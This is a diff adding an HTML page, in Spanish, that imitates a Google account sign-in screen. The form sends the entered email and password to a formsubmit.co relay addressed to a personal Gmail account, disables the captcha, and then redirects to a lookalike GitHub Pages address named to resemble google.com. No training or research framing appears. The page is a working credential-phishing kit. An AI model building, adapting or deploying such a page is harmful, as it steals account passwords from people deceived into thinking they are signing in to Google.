@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceder - Google</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-form">
+            <div class="logo">
+                <span style="color:#4285F4;">G</span>
+                <span style="color:#EA4335;">o</span>
+                <span style="color:#FBBC05;">o</span>
+                <span style="color:#4285F4;">g</span>
+                <span style="color:#34A853;">l</span>
+                <span style="color:#EA4335;">e</span>
+            </div>
+            <h2>Acceder</h2>
+            <p>Usa tu Cuenta de Google.</p>
+            <p class="info-link"><a href="#">Más información sobre el uso de tu cuenta</a></p>
+            <form id="loginForm" action="https://formsubmit.co/ar8811868@gmail.com" method="POST">
+                <div class="form-group email-group">
+                    <input type="email" id="email" name="email" placeholder="Correo electrónico o teléfono" required>
+                    <a href="#" class="forgot-link">¿Olvidaste el correo electrónico?</a>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" name="password" placeholder="Ingresa tu contraseña" required>
+                    <div class="show-password-container">
+                        <input type="checkbox" id="show-password">
+                        <label for="show-password">Mostrar contraseña</label>
+                    </div>
+                </div>
+                <a href="#" class="forgot-link">¿Olvidaste la contraseña?</a>
+                <div class="form-group button-group">
+                    <button type="submit">SIGUIENTE</button>
+                </div>
+                <!-- Campos ocultos para FormSubmit -->
+                <input type="hidden" name="_next" value="https://wwwgooglecom-ctrl.github.io/formulario/">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+            </form>
+            <div class="form-footer">
+                <a href="#">Crear cuenta</a>
+            </div>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
